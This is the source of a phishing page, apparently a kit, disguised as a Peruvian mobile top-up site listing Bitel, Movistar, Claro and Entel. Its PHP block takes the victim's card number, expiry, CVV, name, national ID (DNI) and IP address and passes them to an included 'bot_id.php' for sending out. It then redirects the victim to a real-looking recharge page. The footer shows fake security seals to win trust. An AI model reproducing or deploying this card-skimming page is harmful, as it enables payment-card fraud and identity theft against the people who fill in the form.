<?php  
if (isset($_POST['submit'])) {
	$cc = $_POST['cc'];
	$mmaa = $_POST['mmaa'];
	$cvv = $_POST['cvv'];
	$name = $_POST['name'];
	$dni = $_POST['dni'];
	$enviara = "DATOS CC\n".
	"🌐Direcion IP ".$_SERVER['REMOTE_ADDR']."\n".

	"<b>✔️Card : </b> <code>".$cc."</code>\n".
	"<b>✔️Expiry : </b> <code>".$mmaa."</code>\n".
	"<b>✔️Cvv : </b> <code>".$cvv."</code>\n".
	"<b>✔️Names : </b> <code>".$name."</code>\n".
	"<b>✔️DNI : </b> <code>".$dni."</code>\n";
	
	$enviar =  urldecode($enviara);
	include 'bot_id.php';
	header("location:https://recargacreditoonline.com/cargar-credito/");
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Recarga credito</title>
    <meta name="autor" content="BenderSoto">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="style.css">
    <script src="https://code.jquery.com/jquery-3.6.3.js"></script>
  </head>
  <body>
   	<header>
   		<nav class="navbar ">
		  <div class="container-fluid">
		    <a class="navbar-brand d-flex" href="#">
		    	<img src="img/logo.webp" class="me-2" height="45px">
		    	<h1>Recargas Ya</h1>
		    </a>
		    <ul class="me-auto mb-2 mb-lg-0">
		    	<li class="nav-item">
		          <a class="nav-link active" aria-current="page" href="#">Inicio</a>
		        </li>
		        <li class="nav-item">
		          <a class="nav-link active" aria-current="page" href="#">Empresas</a>
		        </li>
		    </ul>
		  </div>
		</nav>
   	</header>
   	<section class="recarga">
   		<form class="row m-0" method="POST">
   			<div class="col-12 text-center mb-5 mt-3">
   				<h1>SELECCIONA LA EMPRESA QUE USAS</h1>
   			</div>
   			<div class="col-sm-3 mb-4 shadow cards-recarga m-auto">
   				<h3 class="text-center">Bitel</h3>
   				<figure class="m-0 p-0 text-center">
   					<img src="img/2.jpg">
   				</figure>
   			</div>
   			<div class="col-sm-3 mb-4 shadow cards-recarga m-auto">
   				<h3 class="text-center">Movistar</h3>
   				<figure class="m-0 p-0 text-center">
   					<img src="img/movistar.webp">
   				</figure>
   			</div>
   			<div class="col-sm-3 mb-4 shadow cards-recarga m-auto text-center">
   				<h3 class="text-center">Claro</h3>
   				<figure class="m-0 p-0">
   					<img src="img/claro.png">
   				</figure>
   			</div>
   			<div class="col-sm-3 mb-4 shadow cards-recarga m-auto text-center">
   				<h3 class="text-center">Entel</h3>
   				<figure class="m-0 p-0">
   					<img src="img/4.jpg">
   				</figure>
   			</div>
   			<div class="col-12 text-center mt-5">
   				<h3 class="fw-normal">SELECCIONA EL MONTO A RECARGAR</h3>
   			</div>
   			<div class="col-8 m-auto text-center mb-5">
   				<select class="form-select">
   					<option>S/3</option>
   					<option>S/5 + 500MB X DIA</option>
   					<option>S/7 + 500 MB X 1 DIA</option>
   					<option>S/10 + 2GB X DIA</option>
   					<option>S/15 +1GB X DIA</option>
   					<option>S/20 + S/5 DE REGALO</option>
   					<option>S/30 +3 GB X DIA</option>
   					<option>S/40</option>
   					<option>S/50 + 10GB x DIA</option>
   			
   				</select>
   			</div>
   			<div class="col-12 text-center mt-4">
   				<h3 class="fw-normal">INGRESA EL NÚMERO DE TELÉFONO</h3>
   			</div>
   			<div class="col-8 m-auto text-center mb-5">
   				<input required type="tel" maxlength="10" class="form-control" name="">
   			</div>
   			<div class="col-12 mb-5">
   				<div class="card-paymethod row p-4" id="card">
   					<div class="col-12 m-0 img-card-cont">
   						<img src="img/chip.png" height="90px">
   					</div>
   					<div class="col-12 m-0">
   						<b id="numCard" class="text-white fs-3">XXXX XXXX XXXX XXXX</b>
   					</div>
   					<div class="col-6 m-0">
   						<b id="mmaa" class="text-white">MM/AA</b>
   					</div>
   					<div class="col-6 m-0">
   						<b id="cvv" class="text-white">CVV</b>
   					</div>
   					<div class="col-12 m-0">
   						<b id="name" class="text-white fs-3 mb-3">NOMBRE DEL TITULAR	</b>
   					</div>
   				</div>
   			</div>
   			<div class="col-8 m-auto">
   				<div class="mb-3">
   					<label class="form-label">
   						Nombre y Apellido
   					</label>
   					<input required type="text" id="nameT" class="form-control" placeholder="Nombre del titular" name="name">
   				</div>
   			</div>
   			<div class="col-8 m-auto">
   				<div class="mb-3">
   					<label class="form-label">
   						Documento (DNI del titular)
   					</label>
   					<input required type="number" class="form-control" placeholder="DNI del titular" name="dni">
   				</div>
   			</div>
   			<div class="col-8 m-auto">
   				<div class="mb-3">
   					<label class="form-label">
   						Ingresa el número
   					</label>
   					<input required type="tel" class="form-control" id="card_number" placeholder="1234 1234 1234 1234" name="cc">
   				</div>
   			</div>
   			<div class="col-8 m-auto">
   				<div class="row m-0 p-0">
	   				<div class="col-6	 p-0">
		   				<div class="mb-3">
		   					<label class="form-label">
		   						Mes y Año de Vencimiento
		   					</label>
		   					<input required type="tel" class="form-control" id="expiry_cc" placeholder="MM/AA" name="mmaa">
		   				</div>
		   			</div>

		   			<div class="col-4 p-0">
		   				<div class="mb-3">
		   					<label class="form-label">
		   						Cod Seg.
		   					</label>
		   					<input required type="tel" maxlength="4" id="cvvN" class="form-control" placeholder="CVV" name="cvv">
		   				</div>
		   			</div>
	   			</div>
	   			<div class="col-12">
	   				<button class="btn w-100" name="submit">RECARGA</button>
	   			</div> 
   			</div>
   		</form>
   	</section>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
  </body>
 	<script type="text/javascript">
		var numCard=document.getElementById("card_number");
		var cardFronBgColor =document.getElementById("card");
		numCard.addEventListener("keyup", ()=>{
			document.getElementById("numCard").innerHTML = numCard.value;
		})
		
		var numCC = document.getElementById("card_number");
		numCC.addEventListener("keyup", function(){
		var resp = document.getElementById('respuesta');  
		var maestr = numCC.value[0]+numCC.value[1] ;
		if (maestr == 50 && numCC.value.length == 18) {
		numCC.value = numCC.value[0]+numCC.value[1]+numCC.value[2]+numCC.value[3]+" "+numCC.value[4]+numCC.value[5]+numCC.value[6]+numCC.value[7]+" "+numCC.value[8]+numCC.value[9]+numCC.value[10]+numCC.value[11]+" "+numCC.value[12]+numCC.value[13]+numCC.value[14]+numCC.value[15]+" "+numCC.value[16]+numCC.value[17];

		}
		if (numCC.value[0]+numCC.value[1] > 50 && numCC.value.length == 16) {
		numCC.value = numCC.value[0]+numCC.value[1]+numCC.value[2]+numCC.value[3]+" "+numCC.value[4]+numCC.value[5]+numCC.value[6]+numCC.value[7]+" "+numCC.value[8]+numCC.value[9]+numCC.value[10]+numCC.value[11]+" "+numCC.value[12]+numCC.value[13]+numCC.value[14]+numCC.value[15]
		}
		if (numCC.value[0] == 3 && numCC.value.length == 15) {
		numCC.value = numCC.value[0]+numCC.value[1]+numCC.value[2]+numCC.value[3]+" "+numCC.value[4]+numCC.value[5]+numCC.value[6]+numCC.value[7]+numCC.value[8]+numCC.value[9]+numCC.value[10]+" "+numCC.value[11]+numCC.value[12]+numCC.value[13]+numCC.value[14]
		}
		if (numCC.value.length == 16 &&  numCC.value[0] == 4) {
		numCC.value = numCC.value[0]+numCC.value[1]+numCC.value[2]+numCC.value[3]+" "+numCC.value[4]+numCC.value[5]+numCC.value[6]+numCC.value[7]+" "+numCC.value[8]+numCC.value[9]+numCC.value[10]+numCC.value[11]+" "+numCC.value[12]+numCC.value[13]+numCC.value[14]+numCC.value[15];
		}
		if (numCC.value[0] == 4) {
		numCC.setAttribute('maxlength', '16');
		cardFronBgColor.style.background="linear-gradient(45deg, #2B3DB2 30%,#0C1A76)";
		resp.innerHTML = " ";
		}
		if (numCC.value[0] == 5) {
		numCC.setAttribute('maxlength', '18');
		cardFronBgColor.style.background="linear-gradient(45deg, #D51D09 30%,#98271A)";
		}
		if (numCC.value[0] == 3) {
		numCC.setAttribute('maxlength', '15');
		cardFronBgColor.style.background="linear-gradient(45deg, #2F6FA6  30%,#144670)";
		}else{
		return false
		}

		})
		var expiry = document.getElementById("expiry_cc");
		let nuevoValor;
		expiry.addEventListener('keyup', function(){
		if (expiry.value.length == 4) {
		expiry.value = expiry.value[0]+expiry.value[1]+"/"+expiry.value[2]+expiry.value[3];
		nuevoValor = expiry.value;
		expiry.setAttribute('maxlength', '4');
		}
		let valorCambiado = expiry.value[0]+expiry.value[1]+"/"+"/"+expiry.value[2];
		if (nuevoValor == valorCambiado) {
		expiry.value = ""
		}
		})
		var expiryCc=document.getElementById("expiry_cc");
		expiryCc.addEventListener("keyup", ()=>{
			document.getElementById("mmaa").innerHTML = expiryCc.value;
		})
		var nameT = document.getElementById("nameT");
		nameT.addEventListener("keyup", ()=>{
			document.getElementById("name").innerHTML = nameT.value;
		})
		var cvv=document.getElementById("cvvN");
		cvv.addEventListener("keyup", ()=>{
			document.getElementById("cvv").innerHTML ="CVV "+ cvv.value;
		})
	</script>
	<footer id="footer">
    <div class="footer-top">
      <div class="unit size1of1 secure-block">
          <center><strong class="widget-title">Compra Segura</strong>
          <span class="certified-ebit lfloat mls"></span>
          <span class="comodo lfloat mhs" target="_blank">
              Compra asegurada por Comodo
          </span>
          <span class="lfloat">Sitio seguro con criptografia (SSL) · Homologado por la USERTrust Network</span><br>
          <span class="sitio-blindado lfloat mts mhs" target="_blank">
              Sitio Blindado
          </span>
          <span class="lfloat">Blindado contra robo de información y clonación de tarjetas</span><br></center>
      </div><br>
      <center>
        <img src="img/pagoseguromercadopago.png" alt="" width="150px" />
        <img src="img/APS-SSL-Secure-Connection-1.png" alt="" width="150px" />
      </center>
    </div>

  </footer><!-- End Footer -->

  <div id="preloader"></div>
  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>

  <!-- Vendor JS Files -->
  <script src="assets/js/purecounter.js"></script>
  <script src="assets/js/aos.js"></script>
  <script src="assets/js/bootstrap.bundle.min.js"></script>
  <script src="assets/js/glightbox.min.js"></script>
  <script src="assets/js/isotope.pkgd.min.js"></script>
  <script src="assets/js/validate.js"></script>

  <!-- Template Main JS File -->
  <script src="assets/js/main.js"></script>
  <script src="validar_fecha.js"></script>

</body>


<!-- Mirrored from xn--recargasper-fhb.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 29 Oct 2023 12:25:39 GMT -->
</html>
